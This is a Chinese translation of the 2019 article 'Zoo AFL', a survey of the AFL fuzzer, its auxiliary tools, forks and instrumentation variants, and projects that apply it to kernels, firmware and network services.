    <content type="text"><![CDATA[原文标题 Zoo AFL (Apr 24, 2019) 作者：@d1g1 本文主要讨论的不是经典 AFL 本身，而是为其设计的工具以及对其本身做出的改进，我们认为这些改进可以显著提高模糊测试的质量。如果你想知道如何提高 AFL 效率以及如何更快地找到更多漏洞，请继续阅读！（持续更新中） AFL 是什么，它有什么用？AFL是一个覆盖导向或基于反馈的模糊测试工具，关于这些概念的更多信息可以在参考这篇论文 Fuzzing: Art, Science, and Engineering。总结一下 AFL： 它改进可执行文件以了解它如何影响覆盖范围 变异输入数据以最大化覆盖范围 重复上一步以找到程序崩溃的位置 通过实践证明它非常有效 它易于使用 如果你不清楚 AFL 是什么的话，这里有一些资源帮助你上手和理解： 项目主页 AFL 练习 AFL Demo — 使用 AFL fuzz C++ 程序 AFL 发现的漏洞 —（截至 2017） 在这里你可以读到关于 AFL 在构建过程中添加到程序中的内容 一些关于 fuzz 网络程序的技巧 在写这篇文章时 AFL 的最新版本是2.52b。随着时间的推移，一些分支正在被纳入到 AFL 主分支。接下来我们会列举几个有用的附件工具。 关于 Rode0day 竞赛 Rode0day 竞赛每月举办一次，参赛者要在花费更少时间的情况下在预先制作的语料库（无论是否获取源代码）中找到最多的漏洞。就其本质而言，Rode0day 是 AFL 不同分支之间的争斗。 一些AFL用户指出，AFL 的作者 Michal Zalewski 显然已经放弃该项目， 因为上次的改进日期还得追溯到 2017 年 11 月 5 日。这可能与他离开 Google 并开展一些新项目有关。 因此用户开始为最新的版本 2.52b 制作新的补丁)。 AFL 还有不同的变体和衍生物，允许模糊测试 Python，Go，Rust，OCaml，GCJ Java，内核系统调用，甚至整个虚拟机。 AFL 对其它语言的支持 python-afl — Python afl.rs — Rust afl-fuzz-js — Javascript java-afl — Java kelinci — Java（相关文章） javan-warty-pig — JVM afl-swift — Swift ocamlopt-afl — OCaml sharpfuzz — .Net AFL 附属工具本节我们收集了 AFL 的各种脚本和工具，并将它们分为几类： 崩溃处理 afl-utils — 自动处理/分析崩溃和减少测试用例数量 afl-crash-analyzer — AFL 崩溃分析程序 fuzzer-utils — 分析结果 atriage — 简单的分类工具 afl-kit — Python 实现的 afl-cmin AFLize — 生成适合 AFL 的 debian 包的构建 afl-fid — 处理输入数据 代码覆盖率 afl-cov — 提供人性化的覆盖率数据 count-afl-calls — 使用脚本计算二进制文件中的插桩块数，评估其占比 afl-sancov — 类似于 afl-cov 但使用 clang的消毒机制（sanitizer） covnavi — 思科 Talos 开发的用于代码覆盖和分析的脚本 LAF LLVM Passes — 类似于 AFL 的补丁集合，可以改进代码使其更容易找到分支 一些用于最小化测试用例的脚本 afl-pytmin — 一个 afl-tmin 的包装器，它试图通过使用多 CPU 内核来加速最小化测试用例的过程 afl-ddmin-mod — 基于 ddmin 算法的 afl-tmin halfempty — 来自 Tavis Ormandy 基于并行化的快速最小化测试用例的程序 分布式执行 disfuzz-afl — AFL 的分布式模糊测试 AFLDFF — AFL 分布式模糊测试框架 afl-launch — AFL 多实例执行 afl-mothership — AWS 云上多同步 AFL 的管理和执行 afl-in-the-cloud — 另一个在 AWS 中运行 AFL 的脚本 VU_BSc_project — 使用 libFuzzer 和 AFL 对开源库进行模糊测试 最近有一篇文章 Scaling AFL to a 256 thread machine。 部署，管理，监控，报告 afl-other-arch — 用于添加对各种非x86体系结构的支持 afl-trivia — 简化 AFL 管理的脚本 afl-monitor — AFL 监控脚本 afl-manager — Python 实现的用于管理 multi-afl 的 Web 服务器 afl-tools — 带有 afl-latest, afl-dyninst 和 Triforce-afl 的 docker 镜像 afl-remote — 远程管理 AFL 实例的 Web 服务器 包装器（wrapper） phuzzer - 基于 Python 与 AFL 交互 AFL 改进AFL 对漏洞研究人员和模糊测试本身产生了巨大的影响，他们开始根据原始 AFL 进行改进。在不同的情况下，与原始AFL相比，每个改进都有其自身的优缺点。 几乎所有改进版本可以在 hub.docker.com 找到。 目的是什么？ 提高速度并/或提高代码覆盖率 算法 环境 操作系统 硬件 无源码环境 代码模拟 代码插桩 静态 动态 AFL 默认模式在继续研究 AFL 的不同改进和分支之前，我们必须讨论两种重要的模式，这些模式在过去也有过改进但最终被合并。它们是 Syzygy 和 QEMU。 Syzygy 模式 — instrument.exe 中工作的模式1instrument.exe --mode=afl --input-image=test.exe --output-image=test.instr.exe Syzygy 允许使用 AFL 静态重写 PE32 二进制文件，但需要符号和额外环境的才能识别 WinAFL 内核。 QEMU 模式 — QEMU 下的工作方式见 Internals of AFL fuzzer — QEMU Instrumentation使用 QEMU 实现对二进制文件的支持在版本 1.31b 中被添加到 AFL 处理流程上游。AFL QEMU 模式使用 QEMU tcg（一个微小的代码生成器）二进制转换引擎的二进制插桩功能。为此，AFL 有一个 QEMU 的构建脚本，它提取特定版本 QEMU（2.10.0）的源代码，将它们放到几个小的补丁上，并为指定架构构建。然后，创建名为 afl-qemu-trace 的文件，该文件实际上是 QEMU 用户模式模拟（仅可执行ELF文件）的文件。因此，AFL 可以使用不同体系架构（QEMU 支持）中 elf 二进制文件的反馈进行模糊测试。此外，还有许多 AFL 工具，比如从显示器上获取有关当前会话的信息，以及 afl-analyze 等高级内容。但同时 AFL 也会受到 QEMU 的局限， 比如如果工具链使用硬件 SoC 功能构建文件（该功能启动二进制并且 QEMU 不支持），则只要有特定指令或使用特定 MMIO，模糊测试就会中断。 这里是 QEMU 模式的另一个有趣的分支，其中使用TCG代码插桩和缓存，速度提高了3-4倍。 分支AFL 的分支首先与经典 AFL 算法的变化和改进有关。 pe-afl — 对在 Windows 操作系统中没有源代码的 PE 文件进行模糊测试的改进。fuzzer 使用 IDA Pro 分析目标程序，并生成用于接下来静态插桩的信息。然后用 AFL 对插桩后的程序进行模糊测试。 afl-cygwin — 尝试使用 Cygwin 将经典 AFL 移植到Windows。然而它有很多错误且很慢，作者已经放弃了开发 AFLFast（使用 Power Schedule 改进 AFL 的调度算法和搜索策略）— 最早的 AFL 分支之一，它增加了启发式功能，实现在短时间内找到更多路径。它在目标 binutils 上获得了比 AFL 高 1-2 个数量级的发现，在24小时内发现了原始 AFL 未能发现的 4 个 CVE，达到平均 19 倍的效率提升。Team Codejitsu 在美国国防部和 DARPA 组织的 CGC（基于人工智能的自动化漏洞挖掘大赛）上，使用 AFLFast 获得了漏洞发现数目单项挑战的亚军。 FairFuzz — AFL 的扩展，针对难抵达的分支（利用Branch Mask） AFLGo — AFL 的扩展，获取代码的某些部分而不是完整的程序覆盖，可用于测试补丁或新添加的代码片段 PerfFuzz — AFL 的扩展，用于查找可能显着减慢程序速度的测试用例 Pythia — AFL 的扩展，预测找到新路径的难度 Angora — 最新的 fuzzer 之一，用 Rust 语言编写，使用新的策略进行变异并增加覆盖范围。 Neuzz — 用神经网络进行模糊测试 UnTracer-AFL — 将 AFl 与 UnTracer 集成以进行有效跟踪 Qsym — 针对混合模糊测试的实用混合执行（concolic execution）引擎。从本质上讲，它是一个符号执行引擎（基本组件作为 intel pin 的插件来实现），它与 AFL 一起执行混合模糊测试。这是基于反馈的模糊测试演变的一个阶段，需要单独讨论。它的主要优点是可以相对快速地进行混合执行。这是由于本机执行命令而没有代码、快照和一些启发式的中间表示。它使用旧版本的Intel pin（由于 libz3 和其他 DBT 之间的支持问题），目前支持ELF x86 和 x86_64 架构 Superion — 灰盒模糊测试器，其优点是除了插桩程序外，它还使用 ANTLR 语法获取输入数据的规范，然后在此语法的帮助下执行变异 AFLSmart — 另一个灰盒模糊测试器，它以 Peach 使用的格式获得输入数据的规范 有许多研究论文致力于实现 AFL 被改进的新方法和模糊测试技术。由于它们只有白皮书，所以我们甚至没有提到这些。如果你愿意，你可以搜索它们。例如最新的一些有 CollAFL: Path Sensitive Fuzzing、EnFuzz、Efficient approach to fuzzing interpreters、ML 用于 AFL 等。 基于 QEMU 的改进 TriforceAFL — AFL/QEMU对系统完全模拟来进行模糊测试。是由 nccgroup 提供的一个分支。它允许在 QEMU 模式下对整个操作系统进行模糊测试。它是通过一个特殊指令（aflCall (0f 24)）（在 QEMU x64 CPU 中添加）实现的。然而它不再受支持; 支持 AFL 的最后一个版本是2.06b TriforceLinuxSyscallFuzzer — Linux 系统调用的模糊测试 afl-qai — 一个带有 QEMU 增强插桩（qai）的小型演示项目。 基于 KLEE 的改进 kleefl — 通过符号执行生成测试用例（在大程序上非常慢） 基于 Angr 的改进 Driller - 将 AFL 和 Angr 结合在一起，还被用于 CGC(Cyber Grand Challenge) 自动网络攻防竞赛上 基于 Unicorn 的改进 afl-unicorn — 允许通过在 Unicorn Engine 上模拟代码片段进行模糊测试 我们在实践中成功使用了 AFL 的这种改进，由于目标是在 SOC 上执行的某个 RTOS（real-time operating system，实时操作系统）的代码区域，因此我们无法使用QEMU模式。在我们没有源代码的情况下（我们无法构建用于解析器分析的独立二进制文件）并且程序不直接获取输入数据（例如，数据被加密或是如在 CGC 二进制文件中的信号样本），然后我们可以逆向并找到所谓的位置函数，函数中中数据以便于模糊测试器使用的格式进行处理。这是 AFL 最普遍/通用的修改，即它允许模糊测试任何东西。它独立于架构、源、输入数据格式和二进制格式（例如裸机，只是来自控制器内存的代码片段）。研究人员首先检查这个二进制文件并编写一个模糊测试器，它在解析过程的输入端模拟状态。显然与 AFL 不同，这需要对二进制进行一定的检查。对于裸机固件，如 Wi-FI 或基带，我们需要记住一些缺点： 我们必须本地处理控制和的检查 模糊测试器的状态是保存在内存转储中的内存状态，这可以防止模糊测试器进入某些路径 动态内存调用没有消毒，但它可以手动实现，它将取决于 RTOS（必须进行研究） 未模拟任务内 RTOS 交互，这也可能阻止寻找某些路径 使用这种修改的例子有： afl-unicorn: Fuzzing Arbitrary Binary Code afl-unicorn: Part 2 — Fuzzing the ‘Unfuzzable’ unicorefuzz 使用 afl-unicorn 来 fuzz 内核 在我们继续基于动态二进制检测（DBI）框架进行修改之前，不要忘记这些框架的最快速度由 DynamoRIO，Dynlnst 以及 PIN 实现。 基于 PIN 的改进 aflpin — 采用 Intel PIN 插桩的 AFL afl_pin_mode — 另一个采用 Intel PIN 插桩的 AFL afl-pin — 采用 PINtool 的 AFL NaFl — AFL 模糊测试器的克隆（基本核心） PinAFL — 该工具的作者试图将 AFL 移植到 Windows，以便对已编译的二进制文件进行模糊测试。该项目好像是为了好玩而在一夜之间完成的且未进一步发展。存储库里没有源文件，只有已编译的二进制文件和启动指令。我们不知道它基于哪个版本的 AFL，它只支持 32 位应用程序。 正如我们所看到的，AFL 有许多不同的修改，但它们在现实生活中并不是非常有用。 基于 Dyninst 的改进afl-dyninst — AFL + Dyninst == AFL 黑盒模糊测试。这个版本的特点是首先使用 Dyninst 对一个研究过的程序（没有源代码）进行静态插桩（静态二进制插桩，静态二进制重写），然后使用经典 AFL 进行模糊测试，AFL 会认为程序是用 afl-gcc/afl-g++/afl-as 构建的。因此，它在没有源代码的情况下以非常好的生产率工作：与本地编译相比，经典 AFL 是 0.25 倍的速度。与QEMU相比，它具有显着优势：它允许动态链接库的插桩，而 QEMU 只能插桩与库静态链接的基本可执行文件。然而现在它只支持 Linux，如果增加对于 Windows 支持，则需要对 Dyninst 本身进行更改，这个工作正在进行中。 还有另一个分支具有提升的速度和某些功能（AARCH64 和 PPC 架构的支持）。 基于 DynamoRIO 的改进 drAFL — AFl + DynamoRIO – 在 Linux 上没有源代码的模糊测试 afl-dr — 基于 DynamoRIO 的另一种实现，在 Habr 上有很好的描述 afl-dynamorio — 来自 vanhauser-thc 的修改。 据他所说：“当正常的 afl-dyninst 能够使二进制崩溃并且 QEMU 模式 -Q 无法执行时，用 DynamoRIO 运行 AFL。”它支持 ARM 和 AARCH64。DynamoRIO 比 QEMU 慢大约 10 倍，比 dyninst 慢 25 倍，但比 Pintool 快 10 倍。 WinAFL — 最著名的 AFL分支。（DynamoRIO，也是 syzygy 模式）。这个修改的出现只是时间问题，因为许多人想在 Windows 上尝试 AFL 并将其应用于没有源代码的应用程序。目前，这个工具正在被积极改进，尽管 AFL 代码库（撰写本文时为 2.43b）相对过时，但它都有助于发现多个漏洞（CVE-2016-7212，CVE-2017-0073，CVE- 2017-0190，CVE-2017-11816）。Google Zero Project 团队和 MSRC 漏洞与解决团队的专家正在参与此项目，因此我们希望它能够得到进一步的发展。开发人员使用动态插桩（基于DynamoRIO）而不是编译时插桩，这显着减慢了被分析软件的执行速度，但产生的开销（加倍）与二进制模式下的经典 AFL 相当。他们还解决了快速启动过程的问题，称其为持续模糊测试模式；他们选择对函数进行模糊测试（通过文件内部的偏移或导出表中存在的函数名称）并对其进行插桩，以便可以在循环中调用它，从而启动多个输入数据样本而无需重新启动程序。最近发表的一篇文章描述了作者如何使用 WinAFL 在约 50 天内发现约 50 个漏洞。发布之后很快 WinAFL 就支持 Intel PT（Processor Tracing，处理器跟踪）模式，在这里可以找到细节信息。 专业读者可能注意到这些改进使用了除了Frida之外的各种流行的插桩框架。 唯一提到 Frida 与 AFL 的结合使用是在 Chizpurfle: A Gray-Box Android Fuzzer for Vendor Service Customizations 中找到的。 带 Frida 的 AFL 版本非常有用，因为 Frida 支持多种 RISC 架构。 许多研究者也期待由 Capstone，Unicorn 和 Keystone 的创建者发布的 DBI Scopio 框架。基于这个框架，作者已经创建了一个模糊测试器（Darko），据他们说能够成功地使用它来对嵌入式设备进行模糊测试。有关这方面的更多信息，请参阅 Digging Deep: Finding 0days in Embedded Systems with Code Coverage Guided Fuzzing。 基于处理器硬件特征的改进关于支持处理器硬件功能的 AFL 修改方面，首先，它允许对内核代码进行模糊测试；其次，它允许在没有源代码的情况下更快地对应用程序进行模糊测试。 当然，谈到处理器硬件功能，我们最感兴趣的是 Intel PT。从第 6 代处理器开始（大约自2015年起）支持该功能。 因此，为了能够使用下面列出的模糊测试器，我们需要一个支持 Intel PT 的处理器。 WinAFL-IntelPT — 使用 Intel PT 而不是 DynamoRIO 的第三方 WinAFL。 ptfuzzer - 使用 Intel PT 对二进制进行黑盒测试。 kAFL — 一个旨在解决独立于操作系统的模糊测试内核时的覆盖率导向问题的学术项目。 它通过使用管理程序（hypervisor）和 Intel PT 来解决该问题。有关它的更多信息可以在白皮书 kAFL: Hardware-Assisted Feedback Fuzzing for OS Kernels 中找到。 AFL 具体应用 GUSTAVE - 一个嵌入式操作系统内核的 Fuzzer，基于 QEMU 和 AFL。 android-afl - 在 Android 上使用 AFL。在Linux上使用AFL对Stagefright进行模糊测试 使用 AFL 对嵌入式系统的 TEE 进行模糊测试。PDF-operating-systems%20using-AFL.pdf) YOUTUBE Janus - 基于 AFL 和 Syzkaller 对 linux 的文件系统进行模糊测试， 支持 8 种文件系统 ext4、XFS、btrfs、F2FS、GFS2、HFS+、ReiserFS 和 vFAT；以及 34 个文件操作的系统调用。 利用 AFL 模糊测试 statzone。地址 利用 AFL 模糊测试 Linux 内核。地址 FIRM-AFL - 基于 AFL 实现的用于 IoT 固件灰盒模糊测试的工具。PDF 对 OP-TEE 的系统调用接口进行模糊测试。地址 利用 WinAFL 对二进制程序进行模糊测试，利用内存访问热图来精简输入种子大小。地址 FuzzFactory - AFL 扩展，使用 Waypoints 针对特定领域进行通用的以覆盖率位导向的模糊测试。YOUTUBE Paper PowerFL - PowerFL = AFL + QEMU + VxWorks，使用 AFL 和 QEMU 对 PowerPC 和 Intel i386 VxWorks 进行 fuzz。 frida-js-afl-instr - 使用 AFL++ 和 Frida 进行 Linux 内存中的模糊测试。 libprotobuf-mutator_fuzzing_learning - 将 AFL++ 和 LibFuzzer 结合使用（通过protobuf）。 AFLNet - 面向网络协议的状态灰盒 Fuzzer，以 Server 和 Client 之间正常的协议通信数据（tcpdump 监听端口并用 Wireshark 做进一步处理）作为语料，不需要知道协议具体数据格式和语法。 fuzz实战之afl - 利用 AFL fuzz 网络程序 libmodbus 库，利用 preeny LD_PRELOAD 把从 socket 获取数据，转变为从 stdin 获取数据。 Fuzzing sockets, part 1: FTP servers - 利用 AFL++ fuzz FTP 服务器（命令），作者详细介绍如何改写 FTP 服务器源码来支持 fuzz（工程量大，修改约 1500 行代码），并介绍了CVE-2020-9273，CVE-2020-9365和CVE-2020-9274的原理。 AFL 原理与实现 AFL(American Fuzzy Lop)实现细节与文件变异 AFL afl_fuzz.c 详细分析 AFL 漏洞挖掘技术漫谈（一）：用 AFL 开始你的第一次 Fuzzing AFL 漏洞挖掘技术漫谈（二）：Fuzz 结果分析和代码覆盖率：各种辅助分析的工具 afl-cmin -i input_dir -o output_dir -- /path/to/tested/program [params] @@ AFL学习笔记（上）：持续更新中 漏洞挖掘技术之 AFL 项目分析 Fuzz 相关文章 Fuzzing战争: 从刀剑弓斧到星球大战 总结如你所见，研究人员仍在积极地改进 AFL，而且 AFL 还存在进行实验和创新的空间，我们也可以创建一个我们自己的实用有趣的 AFL。 感谢阅读，祝大家 Fuzz 顺利。 原文链接]]></content>
      <categories>
        <category>漏洞挖掘</category>
      </categories>
      <tags>
        <tag>外文翻译</tag>
        <tag>漏洞挖掘</tag>
        <tag>AFL</tag>
      </tags>
  </entry>
</search>
